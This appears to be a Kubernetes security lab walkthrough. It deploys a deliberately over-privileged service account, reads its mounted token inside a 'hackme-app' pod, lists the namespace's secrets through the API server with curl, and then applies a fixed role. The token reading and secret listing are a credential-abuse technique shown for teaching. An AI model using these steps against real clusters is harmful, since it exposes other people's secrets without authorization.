# Example

1. Execute:
```shell
    kubectl apply -f devops/k8s/manifests/k08/namespace.yaml
    kubectl apply -f devops/k8s/manifests/k08/secret.yaml
    kubectl apply -f devops/k8s/manifests/k08/sa.yaml
    kubectl apply -f devops/k8s/manifests/k08/role.yaml
    kubectl apply -f devops/k8s/manifests/k08/rolebinding.yaml
    kubectl apply -f devops/k8s/manifests/k08/pod.yaml
```

2. Execute:
```shell
    kubectl exec -it hackme-app -n k08 -- bash
    ls -l /var/run/secrets/kubernetes.io/serviceaccount; echo;
    cat /var/run/secrets/kubernetes.io/serviceaccount/token; echo;
    cat /var/run/secrets/kubernetes.io/serviceaccount/namespace; echo;
```

3. Execute:
```shell
    export APISERVER=https://${KUBERNETES_SERVICE_HOST};
    export SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount;
    export NAMESPACE=$(cat ${SERVICEACCOUNT}/namespace);
    export TOKEN=$(cat ${SERVICEACCOUNT}/token);
    export CACERT=${SERVICEACCOUNT}/ca.crt;

    curl --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -X GET ${APISERVER}/api/v1/namespaces/${NAMESPACE}/secrets
    curl --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -X GET ${APISERVER}/api/v1/namespaces/${NAMESPACE}/secrets | grep \"secret_name\"

    echo "eW91LXNob3VsZC1ub3Qtc2VlLXRoaXM=" | base64 -d; echo
```

4. To fix execute:
```shell
    kubectl apply -f devops/k8s/manifests/k08/role.fix.yaml
```

5. Again try commands from point 3

6. Cleanup:
```shell
    kubectl delete namespace k08
```
